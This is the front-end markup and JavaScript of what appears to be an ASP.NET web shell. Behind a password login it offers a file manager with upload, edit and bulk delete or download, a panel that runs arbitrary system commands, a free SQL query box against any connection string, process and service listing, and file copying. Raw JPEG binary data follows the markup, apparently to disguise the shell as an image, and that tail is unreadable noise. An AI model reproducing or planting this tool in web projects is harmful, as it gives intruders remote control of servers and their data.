            Bin_PostBack('newdir', folder);

        }

    }

    function newfile() {

        var file = prompt("Create New File", "");

        if (file != null) {

            Bin_PostBack('newfile', file);

        }

    }

    function slctall() {

        var ck = document.getElementsByTagName('input');

        for (var i = 0; i < ck.length; i++) {
            if (ck[i].type == 'checkbox' && ck[i].name != 'selectall') {
                ck[i].checked = form1.selectall.checked;

            }
        }
    }
    function deleteall() {
        var files = ""
        var ck = document.getElementsByTagName('input');

        for (var i = 0; i < ck.length; i++) {
            if (ck[i].type == 'checkbox' && ck[i].checked && ck[i].name != 'selectall') {
                files += ck[i].name + ",";

            }
        }
        if (files == "") { alert("Select Files"); return; }
        if (confirm('Are you sure delete the files ?')) {

            Bin_PostBack('delall', files);

        }
    }

    function downloadall() {
        var hid = document.getElementById("Hidden1");


        var url = location.href;
        url = url.replace("#", "");

        var file = "?name=";
        var fpath = "";

        var ck = document.getElementsByTagName('input');
        var checked = new Array();
        var c = 0;
        for (var i = 0; i < ck.length; i++) {
            if (ck[i].type == 'checkbox' && ck[i].checked && ck[i].name != 'selectall') {
                checked[c] = ck[i].name;
                c = c + 1;
            }
        }

        if (checked.length == 0) { alert("Select Files"); return; }

        for (var i = 0; i < checked.length; i++) {

            fpath = url.concat(file.concat(checked[i]));

            var ifra = document.createElement('iframe');
            ifra.src = fpath;
            ifra.setAttribute("class", "hidden");
            ifra.setAttribute("height", "1");
            ifra.setAttribute("width", "1");
            void (document.body.appendChild(ifra));
        }

    }



  </script>
   


<html xmlns="http://www.w3.org/1999/xhtml">
<head runat="server">
    <title></title>
</head>
<body>
    <form id="form1" runat="server">
    <asp:HiddenField ID="hidLastTab"  runat="server" Value='' />

     <div class="container" >
         <div>
         
        <asp:Panel ID="Login" runat="server" Visible="false"  >
           <h3 >Password  <asp:TextBox ID="Login_TextBox"  runat="server"></asp:TextBox>
            <asp:Button ID="Login_Button" runat="server" Text="LogIn" OnClick="Login_Button_Click" />             
        </asp:Panel>
              <asp:LinkButton ID="Logout" Visible="false"   style=" float :right;" runat="server" OnClick="Logout_Click">
                LOGOUT</asp:LinkButton>
              <h3 >  </h3>
         
         </div>
       
       
           <div class="tab_container">
                <div id="Menue" visible="false" runat="server">
             <ul class="tabs">
                <li>
                     <asp:Button ID="Button_FileManger" runat="server" Text="FileManger" OnClick="fm" CssClass="buttons"   />
     
                   </li>
                <li>
                     <asp:Button ID="Button_CMD" runat="server" Text="CMD" OnClick="process_design" CssClass="buttons"  />
     
                   </li>
                   <li>
               <asp:Button ID="Button_DBS" runat="server" Text="DBS" OnClick="process_design" CssClass="buttons"  />
      </li>
                 <li>
                <asp:Button ID="Button_UserInfo" runat="server" Text="UserInfo" OnClick="process_design" CssClass="buttons"  />
      </li>
                  <li>
                <asp:Button ID="Button_ProcessesServices" runat="server" Text="Processes_Services" OnClick="process_design" CssClass="buttons"  />
      </li>
              <li>
                <asp:Button ID="Button2" runat="server" Text="CopyFiles" OnClick="process_design" CssClass="buttons"  />
      </li>
            </ul>
         </div>
               <br />
                     <asp:Label ID="msgs" runat="server" Text=""></asp:Label>
             <asp:Panel ID="FileManger"  runat="server"  class="tab_content" >
     
   
    <div  id="Div1" style=" height: 63px; width: 100%; border-style: inset">
 
     
 
     <asp:FileUpload ID="FileUpload1" runat="server" style="  height: 40px; width:180px;" />
     <asp:Button ID="Upload" runat="server"  Text="Upload" OnClick="Upload_Click" />
        <br />
         <input type="checkbox" name="selectall" title="Select All Files" onclick="javascript: slctall();" />Select All Files To 
        <a href="#" onclick="javascript:downloadall()">Download ALL</a> ||
          <a href="#" onclick="javascript:deleteall()">Delete ALL</a>
         <asp:HyperLink runat="server">Copy</asp:HyperLink>|<asp:HyperLink runat="server">Move</asp:HyperLink>
      <br />
 
    </div>
               
    <div  id="current" style="  height: 60px; width: 100%; border-style: inset">
    <a href="javascript:Bin_PostBack('shell_root', '<%=  base64Encode("./")%>' )"')">Shell_Root</a> ||  Select Drivers:
        <asp:DropDownList ID="DriversList"  runat="server" style=" height: 21px;" Width="143px" OnSelectedIndexChanged="DriversList_SelectedIndexChanged" >
        </asp:DropDownList>
        <asp:Button ID="slctdrive" runat="server" EnableViewState="true"  Height="21px" OnClick="slctdrive_Click" Text="GET" Width="38px" />
        || <a href="javascript:newfolder()">New Folder</a> || <a href="javascript:newfile()">New File</a>
        <br />
     
       <br />
     
       
        Current Path:
        <asp:Label ID="currentpathlabel" runat="server" EnableViewState="true"  Visible="False"></asp:Label>
 
        <asp:Literal ID="Literal1" runat="server"></asp:Literal>
        <input id="Hidden1" type="hidden" runat="server"/>
 
       <br />
 
    </div>
               
<table id="tblEmployee" runat="server" style=" width: 100%">
            <thead>
               
                <tr>
                    <th>
                        Name
                    </th>
                    <th>
                        Size
                    </th>
                    <th>
                       Date Modified
                    </th>
                 
                    <th>
                       TO DO
                    </th>
                </tr>
            </thead>
        </table>
   
       
    </asp:Panel>
                 <asp:Panel ID="editpanel" runat="server" Visible="false">
   
            <h2> Editing File:</h2>
              <asp:TextBox ID="filetoedit" runat="server" Enabled="false" Width="99%" Height="25px">
                  <br />

              </asp:TextBox>
              <asp:TextBox ID="editfile" runat="server"  Width="99%" Height="500px" TextMode="MultiLine" >

              </asp:TextBox>

<asp:Button id="submitedit" runat="server" Text="Save" onclick="Save_Click"></asp:Button>

</asp:Panel>
             
                 <asp:Panel ID="CMD" runat="server" Visible="false" class="tab_content">
                   
                      Type Commands<br />
                      <asp:TextBox ID="Command" runat="server" EnableViewState="false" 
                          Height="156px" TextMode="MultiLine" Width="579px"></asp:TextBox>
                      <asp:Button ID="CmdSubmit" runat="server" Height="40px"
                          onclick="CmdSubmit_Click" Text="Run" Width="70px" />
                      <br />
                      Result:<br />
                        <asp:TextBox ID="CmdResult" runat="server" TextMode="MultiLine"
                          Height="368px" Width="720px"></asp:TextBox>
                  </asp:Panel>

             

    <asp:Panel ID="DBS"  runat="server" Visible="false"  class="tab_content" >
       
   
    <div  id="current" style="  height: 116px; width: 100%; border-style: inset">
        <br />
      connection string:
        <asp:TextBox ID="connections" runat="server" Height="25px" Width="491px"></asp:TextBox>
        &nbsp;<asp:Button ID="gdb" runat="server" Text="get db" OnClick="gdb_Click" Height="36px" Width="84px" />
        <br />
        <br />
        select DB:
        <asp:DropDownList ID="DropDownList1" runat="server" Height="19px" Width="114px" >
        </asp:DropDownList>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <asp:Button ID="Button1" runat="server" Text="get Tables" OnClick="Button1_Click" />
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tables:
        <asp:DropDownList ID="DropDownList2" runat="server">
        </asp:DropDownList>
        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <br />
        <br />
     
        </div>
            Run Query<br />
                      <asp:TextBox runat="server" TextMode="MultiLine" Height="209px" Width="777px" ID="sqlquery"></asp:TextBox><br />
                 <asp:Button id="executequery" runat="server" Text="Execute" OnClick="executequery_Click"  />
       
    </asp:Panel>
           
              <asp:Panel ID="UserInfo"  runat="server" Visible="false"  class="tab_content"  >
       
   
   
         
       
    </asp:Panel>
                   <asp:Panel ID="Processes_Services"  runat="server" Visible="false"  class="tab_content"  >
       
   
    <div  id="current" style="  height: 57px; width: 100%; border-style: inset">
        <br />
        <asp:Button ID="Button_process" runat="server" OnClick="Button_process_Click" Text="Process" />
      &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
        <asp:Button ID="Button_services" runat="server" Text="Services" OnClick="Button_services_Click" />
        <br />
        <br />
     
        </div>
         
       
    </asp:Panel>
     <asp:Panel ID="CopyFiles"  runat="server" Visible="false"  class="tab_content"  >
     <div>
        <asp:Label ID="Label1" runat="server" Width="150" Text="Enter Source"></asp:Label>
        <asp:TextBox ID="TextBox1" runat="server" Width="384px"></asp:TextBox>
        <br />
        <asp:Label ID="Label2" runat="server" Width="150" Text="Enter Dest"></asp:Label>
        <asp:TextBox ID="TextBox2" runat="server" Width="384px"></asp:TextBox>
    <br />
     <asp:Button ID="Button3" runat="server" Text="Button" OnClick="CopyFile" />
     <asp:Label ID="Label3" runat="server"    ></asp:Label>
    </div>
    </asp:Panel>
               </div>
                 

    </div>

    </form>
          </body>
</html>

ÿØÿà JFIF      ÿÛ „ 
			
















































ÿÀ  ¼P" ÿÄ              	ÿÄ M 	   !1AQ"aq2B#Rr‚‘¡±b’Áđ3CSs¢²Ñ$c£Â4D“³̉áñƒÓâÿÄ            ÿÄ 6      !1AQa"2q‘¡±Á#3BÑđRbáñrÿÚ   ? f_
µTÇÿ ~`~£Ơ”́„«I#B8¿‡®6̀­#`¾\eD>có)¹Hư?öüđć;bYe©ox÷huÑWW7èZĂîzàQ5=ÉäÜ|Ư:Ó¨Óætx€
?´“‰ưö'Ô5¶
°ƠKQRó7ơ([½{dÍ4²r,Bư•Ñ!jªr‹óå¬pÏY=Ïá‚›@µ‚ÈO˜üÊă$¶¹$áßuwnZ™j<Mí_ÙDư£È
	ơ·1†Ê:RÇ…́@Qơœèç‹#¸;œ)bk̀úÈÜÉ>ï ¿.xw1‚ö™ªÆåi7=JW¹û˜”À$`¼­£=¼Lz(ä/È|poƯ-Í ̣Y¥·¨O!Ôơ?†9îVè÷ I úVîËíg–7Óx₫i³[3(ưid!"_B́·<…đ‹YTfw}Àđ“NÏ‹«&ö¸ ÖöPÔ·¿“æˆGsW©<](}#•ÁæbXb³v¾&¦L¨~†2BôsÀ¿Ç—•ºâiÚ6̃4ĐˆC|Í,—Ô–7–CỊ̂1 t†NØl £lQ‹RM~#%eC¥¹öç`¸VVe|°Ậ§«j3zh?Ÿ<iOơ<?RxRqfXÓÀ)#{Ø.\~et¢™áÄÿ >§®=–n?t«Q0úV[Cväî5ê†—8ˆvI¹û÷̉ a‰ºi$¢Ç‡‰¥Ç3aÀ[ÄÜ¼Ùf”xF±¡×í0éĐsü1Q[<p·P12¢ºnâoÄÜØ/w;póZYư)Öè[ËË¡y
 ä8c̉mˆ÷ïơ¯Éä₫	ÿ «đÂM¤¬“@´Đúl›ÆëŸ]\SÆôïÊAtK<½/¢ư£ÿ OL6Ö’f.́Y¼ùypCk«U¤v
ª;1°™$ày·7ÙæđÓ–.r‘ie>ŒcC¯€sÄÑ±vE=3<ëơHv%Ú*Œ9\ :i÷ywùa&8‡}8Đ¨k$G¬Ïc—É .zâÀ³x¶7Ïz·i™I!C…oÉ"¨÷‰g<ØáÎ8UE”[œÏRy±:’nIă|jÇ	5¸¼²»ôü#¢Ưp>ÉSañ₫§ê<K¶öQû>‚àŒËam.Zùyé†z̃ÍÏ‡#1n7¿3ÈđÓÂqÉÛ ³ªˆèëú€Ú½œ¡”jËz?(9·{9¨LÏ
¨6Cv¿Ö¦œ4‹sÂáºỢD°³á2™ŒY†U3Û‹e@ê]58(1Ç2pIí%E¼­ù Çd)	ó?æ„ÓnÈÉá ›r₫Wk</è1¯Ưê˜Y]T †\¡”#pTÇĂ’q©Çcµ[ÇJ…Ư‹„Ç+‡®¿̉›v'Ú‘¯†̉øjà°”p̀8,ËĂÚ÷¬4kơ\ZíÆ̃œF¤Œ ₫bÚ0ơçç|QÊ:¶…̉h€Ï^Ü;Å>ÜGí0Cîë`·+{Bªb7I7Ú† ùëĂˆ#T•qâ®o•b´vgkË‹ “sÈñô·ˆñ¶vRÏFÜhzDzWíØOăˆøe‰³!<‹{z£ƒ•‡4vñd(êUƠ]uV̣:ŒûXØ^ÅBé{$ŸªÔ†&Ă¥È₫éûº´´Î–W	7nºqô¨k›óZ–P2Ç,bE^!UïàŸvá”kÂØlÇ(åO?ä~#ï”K«)‡<lr0¿âtÀhï*úù66ÀØ%*™$‹ÄNÈọ́tÚ™eO0à_5ùđy¡ÙË5=TX&oºÓV©“_³Qß€y:iV; Ú}Ơm9½ƒŒù‡R¶ưë[₫Ïc²H[Ù«¡‘OÛ¦•
[̀-D‡îàjÀ€lBŸ<•.ƒ1ñ´ÛSæ…Nwßuw…®WÚ¾²dú̀GƯ.ë‹7Ûvâ¢rÓ̉–¶²ƒăN¼aæ<ñZ-‹Ḥ½ Ø(!©‹n7Ôî˜öq"AäHưq,¢¨(ÊĂ²°>jn?LE¡_¥ûÇ%Ç¬cH:#jey¶§njØÅµÑ;é¤`‘„RÄèOÿ › 5&ĂRq^»JíAª¤Đ‘ƯGQ̃Io}‡+œ Øq$ªí‹nÈ" UbjXƯÀ:3&€fÙ´×º%Wëˆo{-$.·x\uêÚíË²£0’ªÿ x‰sT"
'ˆ
*"‰ Y×‘ -\XbíîöƠK…‘u„
ÄÂĂ‰@8t¸(„‚{ṕ³»Í]L…".VªtÓ/kq‰ÉáÔ£WaƠÅ®î&ß‚¶Å°èæăiuĩßí©i;ÇD·¶èŸ¾áođ¾]°Wå†8Ç¾ü<«
·FƠă₫4g÷Noá‰m̃H¢1üZßôŒ_<^F„ûøBÖÍeơÓ÷áù|páµ†̉FđPXü8đÁ$«E›tH́›w“‡"éN¹üŒ­p·ê@̀Öû=qk»?Ư[Ú¢AÏèÁçûé'a[§(E¬Ơ¿sÀ„ eÂüN,̀Q € ÀÓ	¸Åa#Né§³¸`©˜ÔËåiÓ©[Wl›aZJ:U:‰¦P>¬1”EoY&F·́ŒN÷«x:÷ÛD^§™>Cư0¯­É¦œ’x’f§¹ü±Y‡R—;½vÁ]öl,4±ùˆ7è?´í6­ª`NˆUTr
M¿N!•’YO¦%}£Úª>Øÿ "bµ_ĂñÆ„Ï(Yœ"å¡6,eˆöÂiåø±µù®₫t6låâỌûƯBÙª-w•„qv¸¿ç`}JđÆlÏ#Aè:”ĺ»p’È¡m [Ûn6>¦å‹kr | ·đG±¶ZÂ‹đ^'ëÄüN!½ ïu¯O?ñó~Ïd{ëf°ÙhỒ‡¢ï%óù“ËÙ%ß}öÏx¡6@lî=ÿ !û>|đ3̃
â™3Èx›".¯#rD^, 5$ N8ï6ó%2‹‚̣½ÄQiÈâOƠE½ÙÎƒN$€G;¹fÏ1Đ[Ø‰³ˆex\ûMk“Àêj¢ĂâÈƯ\¨0œ¯´•?† wü7û[mJéj[<ú*œÑS‹”ÜÏơ’§Â¾è́x3c¤qŸUT¾¡ù¤+è¼?‚‚!
;@hùüÖ¤ăŒ‡»c‰8«yWMZœqsØâ[¸¢<ØÑ7cLp9(¦…áÆ‡ăCˆIR-±2́¯mey)[ÙkÏ‘$wÉûÅds¿LBYñµ.̉0¼s¯µ°æ¶"EûÑ—[u#¦/0jĂIR×đ&ÇÑ'v³$Vñ4fo;€®wek2´ê5×Ư:0ø1ă‰₫Sg¦˜tPăî0oĐ	·l„Sur¢ăI,/é¨86mˆsG*ơÇâ¤cF«`¡¯nÇU†`•ªĂd‚MØOËEóó·8íKAûGû¥×₫œ©̣̉9ä –Ư¼C₫íOå_Qøfœà³WÚo¬ÄA Ăd[«M¤GÔª|ØƠưÔ‘È?«‘÷X7đÅÙƯº¬•t¡£û³Á*Ạ̊~X£1œ[íØÚYáÙÓóYökŸ…L¿̀>8âµ·ˆ…C»ºÈ?ÜÍ»NÙ%¤ªÕ]₫ºRîƠ·Kæ•Z)~’;pö“î·.„cèhÛ7<Üâ!Ç¥́ß‘¾*×n¾%¥2jÏ)đ¸ôÔ»0©‹ăôRc0| må~¿5W)Ç̉Ÿ+ŸËÊpËD9B ₫?¦á½f‹Éµ·¢•v®·¥Ù
ÿ tưÖưp>Ù”y¼ḾßÂ¿]¿ô‹kÈÛ ÔŸÚ̀ÍC²3_Oœ̃Ưƒñ—!ˆ®ÂÙ
#ª*ƯØ„D²ÜØñcÀ[ ÄMºöƒ!ÿ r®•%QR~¼®± F ØÓÚjáP¹€(,Đ-U,tÎ™´̉ÊÄ)²Ê«Ưö‹{RT6£Jy‹‘è›ö‡¸y8ƒ^ïîëỜ‘¬²S¬jÓÉ,D¬¹E"8öç9·U"Ü1Aˆ@Ư¡TưhªE ÿ ëí÷²ÿ ™ÖRÔSƯè§˜Û[ÄùđÉ}U”‚ mt Ø©öÊ~?î¿êl¶¶èUB°Ï#H!j´9$W.̉	 ‘Đ³.cqâoƯ´¥‹Î/úÂêá®<4Pv‹
5‚1±ôºíVö~8÷vè®±2È‘|µù;Tû?á‰b»7¼¨­¤Ḥü\•[úqë‹Ù”ªAË¸}”́€¨̉ZÖ$̣
íù†&ơƠË³±²῭~‡RNƒ÷cg÷pÄ¼̣†>­©ưmˆ/h;É̃7r¦éñ¬ÜưBđơÆsƠTWZH¸>ËùÈĐÈëôLÁ¶Úwgnz*ưUä?‰óÀ₫§y£5±B—l©,R8öÜ$©₫½¢$¨à¿…é¼­AcQ(6'U†>
3.¾óÛ$DéèÖ_êçÙ¬åß$íÄ³bIÅăçd±üJxv>#ở̃Á¤¦Ê%Ú„v«›Ï»?̣Ôb¶Aë‚GlqZ¨Ÿ­Ô
6˜¹QÔÿ ¦˜|.Ó‹ÑmI	6@.[*Ô±7Åá́;uH¦ßĐÆ±9»·®§÷†*7f{/¾«†âêŒ̉°̣‹Â¿ÖÅôÜº.ê/a™LŒ~Öºú-°»ŒM–<ƒr™°Zq=`s¼¬¯æúo§Ăư#Ü'—Vøró¶ ûÏ¼¢sŸH?zGâxđ x™½ƠôG¿;Ø¬dÉ đèI
8 £R̀x(Ô±°¾›_ìÎje^#*ÆN´ñßE³6†CÍ¬8*â˜ÈÚoüÊµ†–NÑâ[A±<ư:Ÿ²W•™Yi\xÛ‚ ÷c^CnI'I[)vº?¯C¦:HØCWHâçî¾¤‚8#lQ €›¶8±ÆîØâç <«V…£s8ơ9»àGCBäçÉÆÄăFÀÎD´-±Í±³cF8ÅNÔ¶9–Ç²$«Ú)¶måÄŸ@?øÄk¤¢øÅka-©,ÆÑ‹}\Øü áÇ¹÷>¢I#‘_fIñóâxuM8cĐu\fDŃ£h–§„s‚C ‰ü̣ÊKbÚqKû–ß:N]äR¿Cÿ “ùâæÓ5ƠOUÿ k“½¥‚N‹æê:o…Ä«àf¿Îç̣¨OÊ	¿Ư¢ëóê‚> €D* ·@¿í?
¿Ÿÿ î?ŸÏµĂ´>P‘m¿ä~åwC‹[Ù¦ÏsK³â`sÉ5  j´p~́c1̣¦]’n­˜3÷xl̉₫Ñâ±¹¹ùÔ^ÜöaAß×(î¨"ïœpúyƒEtc9¯Qˆ+e…̃‹Êh₫&¶(›Á×>vå»©spî̃ÿ ºqWûI¨ITOå‡©6ó8±] íîNẸ ûÇ_đß¶Ư¹––Q{	'H—‡³ç‘¿|·ë¬!‡)<Ê³í[„•q0÷*»P¯̀’ÇâM¿L9RÆI jN€$̣¤é†ú5̉üÎ¿Cà-üœ;ÜNñ¾w(đFHˆí8÷½‘úßdá¯6QuEQ eÜR×öwqK³b>̉1R= 9¿ÄFöy,(k'ÖWSÄ̀Tè̉~È>ÈcÈ_†4íÓo¬µ@†ÿ 6Gï-ÊY²Ù}UärÏˆÅ¢yƯTfcpª8’ÜÙ^¿,ß)ê£2øê}ÍÓx{s·˜â=<üño~H[Ï%_ÏLÖf‚Hƒóuf©l̀8f (=rùœTê­ŸÍ5?÷ç‹/̣oÓ^«HR?Ç>Å5vg+«˜x‹ư‘å¼1CON®m$•Ô‚5“–dïôEBAc ,£‹ûm¤ÿ ³¿^ñ	ôÊGêØ—|¦¶\…–­³K(o`ˆªKpÍ$‰&¿R8úá«µQ%2¸÷_àÀâ1Y€ ÈÅ'n®k#yú Úm¡₫>M»;ÈÖÑ¤†ô_oóÀ[l{¾læ1j>K;èăsÖI~7îÇçs†:ù;¸œz%:h»×Ç7}.;ß¶ûˆ_m¼(:\jßùÛ ÍâÛ¢̀Fgc–8Çsrù(âíî¨'ÈËûẼUgv$¡oö}£æIĐz`C5CJæW¸$Yû4ÓĂöÁœơ°à¢Êq¼QÁ˜ùo…ø₫#~Äz₫q?d˜©gsYi©àz"
¯!Ô’K̃ÅÜù+sF*CÈÚ"-Ç›t^$₫8…×O;¼ËÊlM½Ÿ´§ë&„ú^ø!́}Ë¦„ ©˜ûÏ#4ŒÇëäê|­é€¡£’ ™µºvÆ1ú\6̉ˆÉ °Ù;]SÅà±·ÖSâüÛ•»/'~ÓèíÅLÑ‹}I‚Î€y(!~U₫Éùơ¶4?l]a¬#1#kưÎˆ¹̣kØFY­ÄCû́]ÏÀ N-h;\E‰xÉáôAÇñĐ~8	|‘öG†Im w7û*‘Ï6&ă´ª~î#c#÷10×"-ËËc¥‘C>¼NQï+Öú‹»ÊÁr¨Ă™JæÅû“81¾œ+mÇƯ¯œH*$ ĂNÿ B	*Ù¥óX
Ơâf<cS…Ư¢vIXgˆ*LÀ‰/Ú˜ư`5ç×½Ÿ@‘"GÊˆ¡TyaæIâOp¤gu•¨”¼û»`Ø\xu+``ơ<Ï¨ơn¤”®ÊêË•¸0!̣óƯnwµơCK¼Lº7ˆsñçÏC»;†¹
° I,8}VúÈy‚}9âö“¸sĐÊUÔ‚†à¬‹}núä}5đ¶SíB×‰ễÅ&§zZơ]OĂ˜ơÙ›]™´̣•uàxúsr#¡àq6Y..8ăĂókNüíZ±ÇluvÇâ¬¼c±³œq8”@V8áQP]ˆ©ĐaÙÛË7Ơ¬M¸|Iä1Ú{yæçæIÑQOo¬G uëÓ†._0fœTjo]î"Ó‘sÇà8\%Ư]Ü²UTG—1µÀ$¹èœÏ›hª/®„ÎÍ{)¨Ú**›q`Ú Ÿ^Sî¯´Ü-ÄbévuÙu>Î@”¨Ï) Êq?dqçĂNĂ8!₫.ù(¯eƒEHZ²N,V1¬q#í¸êt®EđMÛÛ*˜̃	”4n,G1Ñ”̣`ua~6ÄÁ 
ÅåÆÿ àUŸ`î|”5Up> $Éă-6Ṿ:G",æÚÚưÅ$“êéËQƒâl0Û}åUdœ»å́A©øÆcñÄÏ·=äX(¢„Æ0ßƯFI¿ƠĂt…§aäJùözàqùÇAïk*?ÛFĐÏUƯđCN>âæ?ÎGĂM…²¢D†1™ä`ª9k̀ôP5'¦8í}¢f–Y›Ú–Gưö-oA{!‹Øg?6ç3-§•|*xÇáèÎ,O0,:áƠ£+l‘j¦2ç~
_»›
M–öXÉ+ưfîßh:X`¥̣pÙn±O,¢ÓT:Ë(æ¬ÀåŒÿ uHù{>xo
bO44!:TÔ(:ˆ#a‘[§{6QcÅN¢ö²{Bíơ¤:ù*úß¸‹¯ơ²'³p«ivä₫lmó₫“lÛt&Uâ"F•”s6đç`mëeÛØ-$—
ÜÇb8dñÉÿ Hû̃X°½¯obç–Gö4‡Î8,UGœ’wInqPD’ỜÏḅÏ&€s,Ú[ÈŸÊØ>†,ŒhQÔËñRNv½‡ Đ'­ÄƯ­™c[„)_ê âz\đQ̀ùƒ—h»Ú»:8)́³:÷p=Ú(¥ ñË ¸.GíaNë́X6M+¼¤
w]ưØÓ™±9Ps&üđ	̃»-\Ï3ûo¢'(¢ÂƒÉnI>óÔXÇ»1·Y~&LçÊ>¥!¥€±°¹$Ư˜›x’OcÏÔô½ˆ́?³̉¡jNf…mÀúå¯=!½ödj;ƒƯ!6ÖGúƒ¯+ô ˜¹Û£ºk‡pe̉1n¶ü1_]V!m†ü“
%ë$îÛå¸đ_<ç£×ùè>?Tùû'Ë#¼¢¶¢ mßR’AĐƒˆEÇÙ‘ºéˆ§j]”Tlç´ƒ<L~`<,:ªƯTü.8 ́*°RmJodiZ²ÔFđ‹tGF·
9`º̉ÚGd7ÑI„¸̉×Ç̃Œ¦öùè¬oÊ[dw”ÑyU>K55L_ædü°-¤§g(>Ù§ÊĂ˜–/„‘Û¶md¥¨ÄQà
Mà"B™U#ă€¶ÁØæœÉqT^qƠ&f̉e˜[¥ºáG˜we7öî¾™• yH¿¡ÿ °«Ù÷>Ơ¿#‹§Ù_5ÙƯçhÑíó9'Óz6AJ
¸T”QÔ]²₫"ß-̃ÔŒT4Ư]ÅÙ¾ k³H|ăˆ¿´PsĂf&àX/¶çĐ,÷sÇw«¬@ơv€ûŸd4̃=«ßHPkMâ?^aË¡X_́ơØêdX£±Ô
£‹7Ă®6̃mØƠ2ÓFLÁ¢QrrJ3 9Ÿ¤Î·ê¸9ö}¹B’ÆÆRJt<5EçÔÜôÆ}YVd~o—¢úĂcĂéDMßwnâJ
í½„å…
ĂUKr}¦_mÈ¦Ï’̃WÄ„3í¦f’••$”–¦\±¡rdjJê¦h·zÅñ1UØcMùƯzø•^GÄú§7t?VIˆæ?³U é¸âö²(!ñO˜ö‡¬Åkƒ`o„7̀v?_EíJŸĂ8úñE:zÁ'u/ø&‹à0®:[©Qø°Á}öBçOh÷‚Jwgvv"t*·g,OÓ¹à?´ăÊB"@•¿¦đê¶ÔD\̃iJ¿“°JA6ăb­¿ar|×d¬—úJ‚ázÙ̃G¿Á\|m·_xÚ	̃räj;Œ«ư(×4²G®V9²¡Cb{³cs•£{¯´̀{>êé“"ơy µüË2‹̣ËÛ: ˆª5F·¾bu,z–$±:ÜxJfÈ×µÿ ÉWªËK;&ˆ~̃‚ăKÿ $gÙ;^)Ñe…„ˆÜz
‘ÅYMĂ+ À‚6W€\RONæzF!₫’¿qR) ö$°²Î ²ó£.	Û—¿°Ö«¼sÇa=4KÉÑ½ÙP”n ÜïĂ$¥uÆ­çư¯ 0̉Sâ±ÛË Ư¿¤¥±ß½Æ‚¾&U±Èö¹BPy¯?#b$xËâüS_<{QÜJ™;G 6¾emrH¢úßŸ†á03qGsƯ=ª$AmHĐu·0n>¹Ư£öuÓ ˜XÚñÈ=¨ß‘‰×ˆ¿NƒN§aÏ±ëZ’¤€
îßÑÈ‡Vüˆ¶™I3>̉³¨_¢=Ô—àTÚQm
î8üqÀ¶,­6ăRmZX'aƯÎÑ(ic 1t_8à÷`Nºë¡ï/bĐ|á9<ZŸ¼„æ<S¹¥^2V“c¢9Â
«´–$g<¯o3oÓ¯–
;¿Øe|çÆŸ7Nm)û¨	cñÊ<đí­â/ILÍ$täÆ̣7	%BD̀@ámàrX­®nmĂc.:®ä­n¡Kj´̀OS›Q²Åyß„qûÇ^ÁŸ±>Àg­a#î%k—a{	̣’cÆ×ÊsĂÿ ÉëäÖƠ++C$DæG’₫ñæ	[Ưµ‹b̃Đlô‰V8ƠQ ª¢ÊÜ†È›xéëî¬qˆ`Pª-sÅœưgn$₫œ€Ă°8óM¼¹ăÅÁ&÷+lG÷»~é¨—4̀K̀ÇâEAv+Ç…}é,kÍ†—…ïk¦bÑlÜ²u’¹Á0!æ)×OœÈ½A©âîU£À÷x(R¤´“ƠÈ‘<²¶idRsK™´V”ª X×‚¨ĂNÉP;É<-ú•c½²¦¡wĂÀCåé³}Oá=nÉi7`CÎÆfSÅ^¡̀¥—ËđÄ;å—¾×•hĐé6r9
€O
º°æ­§;÷e•eÜÙ"&W6à±çO»ë¶7^}©]3HX	eùƠSê‘Ô
Za{x̉r̉Ê}t^ègcFÍ£ª)ªus¯n{₫JǵG³oœ?Î¦Axđ’Ab=Q4¿"l9÷×R›,Yê$V*©®[¼–ÓLë–;Ư‰^
KÚ5f8$†„*,:÷™ADtRh8I.mû*I½Ïƒ®Ñ¶jE$‚ÁV±®I%Œ•f́Æå™̉±$’Çx̃(i""=ÎÅ3v[³ÍÆjûÚ“úl#ĂÄñ×–ëÎË¨ÿ ̃¦Ư©ï$«»¼¢́Çîè£E ±kiª₫m@­Á_µ)6> ü1X»'‹4³ÛwWy­₫\>P[î(àÈ?îñ€«{Ô,cá£‚ø
Í=,9É%Çæ‹Ç‹)qJ·D-f¶6Ô°U§·mïÎÆ™´ÁXI₫/^î.6ÖWØßg‚™>u8#%ă§u½¦½²³đ^—lGû!́íªdÿ hƠŒÉ{À®{XGƠ£̃Ê
­kÙ]ËƯä™d­©̉†<¶<*\±̃̣“k}#€}„ăES)Ùś9¤êJ	+el5{¸ç5Wûb̃¹f¨0dH
÷qiĐ?y ÷HFVƠ7³£¿f=›ÉU ùn;É áû)ÇSî¯©Ç»§»V®YlÆJ‰Y×îÄ[(ó°Ô@is7q©ö\Jí Đ’Ä›ócÍ¸
-ĂKUÜÆ/ç<̀TAï1Å£»¿Îi^äîLTQ©` ²¯ÔÅÏäăóog/Ư¾³t₫m†íæ̣̃M´/É}Ô›uo.~X‹Ä¥f¹'RO\VĂNd=äªÙơ̀7êz”G‹hĂVOT¨ÁÆRØ{ôú­æ̣#ßµÎÁ'¡&ª‹4!=é e`ÊZẤÖñơ¸“è¤R<-ĂÏ»|vI®ÑđÍÅ—×ë.?¦?G˜¶;·úB6®9‹c«ÑÀèÿ íJ6~ÓZÊX*©<I!ˆ)ô$©ôÀË~·|@”EI+BO¥CDM´Ñ¢*<ä=q;Ü9QEE"•Ë†h2û&¤´‰aÀd›¾‹/ ƒAqí±̀ôóD£Ç—<̃DD‘ÿ @ô¾Ù!§ªa¾Ÿe¨ƠÓ·Ă_ Ư»ơ¨UOz÷zûJ̃̀†9~1ß7ä€üpSƯ
óTÚqÁ%{LcG'U‘ˆp¿~8‚ơĐxoz™à¨QX¯R%P-ånp+ª¯’m ~næq÷j‚́ÎÈđÉ©°$ùáÛx}=¹‹,g²18â-¿đç²µ›S`Æki§qâîezB$ORªÓèO!‚
>w¿¡̉ß…ñ	̃fa̀ASä©Ê5# ¼«§ÄeM8æÄöj,#˜<ư3vêö_BÊmqî˜*ÇàP-€ ¢‹đ å„ÛCg¤ªÑ¸̀
²‡˜ó,;mXµ¨ư0‡;D[
